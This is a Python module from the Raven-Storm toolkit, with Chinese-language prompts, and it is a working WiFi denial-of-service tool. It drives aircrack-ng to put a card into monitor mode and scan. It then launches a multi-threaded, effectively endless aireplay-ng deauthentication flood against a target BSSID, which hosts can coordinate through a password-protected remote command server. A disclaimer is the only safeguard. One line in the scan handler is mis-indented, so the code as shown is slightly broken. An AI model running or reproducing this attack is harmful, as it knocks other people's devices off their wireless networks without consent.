# 2020
# The Raven-Storm Toolkit was programmed and developed by Taguar258.
# The Raven-Storm Toolkit is published under the MIT Licence.
# The Raven-Storm Toolkit is based on the CLIF-Framework.
# The CLIF-Framework is programmed and developed by Taguar258.
# The CLIF-Framework is published under the MIT Licence.

from os import getcwd, name, path, popen, system
from sys import version
from threading import Thread
from time import sleep

import requests
from CLIF_Framework.framework import event  # noqa: I900
from CLIF_Framework.framework import tools  # noqa: I900

try:
	from os import geteuid
	geteuid_exists = True
except ImportError:
	geteuid_exists = False

event = event()
tools = tools()


class Main:
	def __init__(selfie, console):  # noqa: N805
		global self
		global var
		self = selfie
		var = console  # noqa: VNE002

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.interface = "wlan0"
		var.essid = ""
		var.bssid = ""
		var.mon = "mon0"
		var.channel = 11
		var.threads = 2

		var.wifi_debug = False

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.commands(self.show_values, ["values", "ls"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.help(["values", "ls"], "Show all options.")

		event.help("scan", "Scan for wifi networks.")
		event.help("channel", "Set the channel.")
		event.help("bssid", "Set the targets bssid address.")
		event.help("essid", "Set the targets essid name.")
		event.help("mon", "Set your own monitor interface.")
		event.help("interface", "Set the interface you would like to use.")
		event.help("threads", "Set the amount of threads to use.")
		event.help("run", "Run the stress test.")

	def banner(self):
		system("clear || cls")

		if "/" not in popen("command -v airmon-ng").read() or "/" not in popen("command -v airodump-ng").read() or "/" not in popen("command -v aireplay-ng").read():
			input("\n[i] 请安装 aircrack-ng 以继续。\n[按回车继续]")
			system("clear || cls")
			var.stop()
			return

		if geteuid_exists:
			if geteuid() != 0:
				input("\n[i] 请使用 sudo 权限运行。\n[按回车继续]")
				system("clear || cls")
				var.stop()
				return

		print(("""C_B----------------------------------------------------------C_W
THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
THE USER ALONE IS RESPONSIBLE, BE IT: ABUSING RAVEN-STORM
TO FIT ILLEGAL PURPOSES OR ACCIDENTAL DAMAGE CAUSED BY RAVEN-STORM.
BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY
FOR ANY DAMAGE CAUSED BY RAVEN-STORM.
EVERY ATTACK WILL CAUSE TEMPORARY DAMAGE, BUT LONG-TERM DAMAGE IS
DEFFINITIFLY POSSIBLE.
RAVEN-STORM SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("祝您有美好的一天。")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("输入 shell 命令：", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("输入调试命令：", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("您输入的命令不存在。")
		print("")

	def check_session(self):
		if var.session[1][0] and len(var.session[1][1]) >= 1:
			if len(var.session[1][1][0]) >= 1:
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			else:
				var.session[1][1] = var.session[1][1][1:]
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			var.run_command = run_following

	@event.event
	def on_input():
		self.check_session()
		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
				if data != "500":
					var.server[4] = var.server[4] + 1
					var.run_command = [data, data]
					print(var.ps1 + "\r")
					break
				else:
					sleep(1)

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	@event.event
	def on_command(command):
		if var.session[0][0]:
			var.session[0][1].write(command + "\n")
		if var.server[0] and var.server[1]:
			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
			if status != "200":
				print("")
				print("发送命令到服务器时发生错误。")
				print("")

	@event.command
	def debug():
		var.wifi_debug = True
		print("")
		print("调试模式已启用。")
		print("")

	def show_values(self):
		print("")
		print("接口：%s" % var.interface)
		print("ESSID：%s" % var.essid)
		print("BSSID：%s" % var.bssid)
		print("监控接口：%s" % var.mon)
		print("信道：%s" % var.channel)
		print("线程：%s" % var.threads)
		print("")

	def help(self):
		event.help_title("\x1b[1;39mWIFI 帮助：\x1b[0;39m")
		tools.help("|-- ", " :: ", event)
		print("")

	@event.command
	def bssid(command):
		print("")
		var.bssid = tools.arg("BSSID：", "bssid ", command)
		print("")

	@event.command
	def interface(command):
		print("")
		var.interface = tools.arg("接口：", "interface ", command)
		print("")

	@event.command
	def essid(command):
		print("")
		var.essid = tools.arg("ESSID：", "essid ", command)
		print("")

	@event.command
	def mon(command):
		print("")
		var.mon = tools.arg("监控接口：", "mon ", command)
		print("")

	@event.command
	def channel(command):
		print(" ")
		try:
			var.channel = int(tools.arg("信道：", "channel ", command))
		except Exception as e:
			print("执行时发生错误。", e)
		print(" ")

	@event.command
	def threads(command):
		print(" ")
		try:
			var.threads = int(tools.arg("线程数：", "threads ", command))
		except Exception as e:
			print("执行时发生错误。", e)
		print(" ")

	@event.command
	def scan(command):
		print("")
		try:
			system("sudo airmon-ng check kill")
			sleep(1)
			system("sudo airmon-ng start %s" % var.interface)
			sleep(3)
			system("sudo airodump-ng %s &" % var.mon)
		except Exception as ex:
var.command_log.append("错误：%s" % ex)
				print("错误：%s" % ex)
		print("")

	def ddos(self):
		system("sudo aireplay-ng --deauth 9999999999999 -o 1 -a %s -e %s %s & " % (var.bssid, var.essid, var.mon))

	def dump(self):
		system("sudo airodump-ng -c %s --bssid %s %s & " % (var.channel, var.bssid, var.mon))

	@event.command
	def run():
		def execute():
			print("")
			print("停止攻击请按：ENTER 或 CTRL + C")
			print("")

			var.ps1 = ""  # Change due to threading bug.

			sleep(3)
			try:
				t = Thread(target=self.dump)
				t.start()
			except Exception:
				print("无法启动线程。")
			sleep(2)
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
				except Exception:
					print("无法启动线程 %s。" % thread)

			def reset_attack():
				print("正在停止线程...")
				system("sudo killall airplay-ng")
				system("sudo airmon-ng stop %s" % var.interface)
				system("sudo ifconfig %s up" % var.interface)
				system("sudo service restart NetworkManager")
				if var.wifi_debug:
					print("Saving debugging log...")
					output_to = path.join(getcwd(), "wifi_debug_log.txt")

					write_method = "a"
					if path.isfile(output_to):
						write_method = "a"
					else:
						write_method = "w"

					output_file = open(output_to, write_method)
					if write_method == "a":
						output_file.write("------------- New Log -------------")
					output_file.write(str(name + "\n"))
					output_file.write(str(version + "\n"))
					output_file.write(str("\n".join(var.command_log)))
					output_file.close()
				print("完成。")
				quit()

			def check_stopped_execution():
				while True:
					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
					if data != "True":
						reset_attack()
						break
					else:
						sleep(1)
			try:
				if var.server[0] and var.server[0]:
					rec_t = Thread(target=check_stopped_execution)
					rec_t.start()
				input("\r")
			except KeyboardInterrupt:
				pass

			if var.server[0] and var.server[1]:
				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
				if status != "200":
					print("发送数据到服务器时发生错误。")

			reset_attack()

		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
				if data == "True":
					execute()
					break
				else:
					sleep(1)
		elif not tools.question("\n您是否同意使用条款？"):
			print("未接受协议。")
			quit()
		else:
			if var.server[0] and var.server[1]:
				if tools.question("\n您是否希望将主机用作 DDoS 的一部分？"):
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
					if status != "200":
						print("发送数据到服务器时发生错误。")
					execute()
				else:
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
					if status != "200":
						print("发送数据到服务器时发生错误。")
					try:
						print("[按回车停止攻击。]")
					except KeyboardInterrupt:
						pass
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
					if status != "200":
						print("发送数据到服务器时发生错误。")
			else:
				execute()


def setup(console):
	console.ps1 = "WIFI> "
	console.add(Main(console), event)
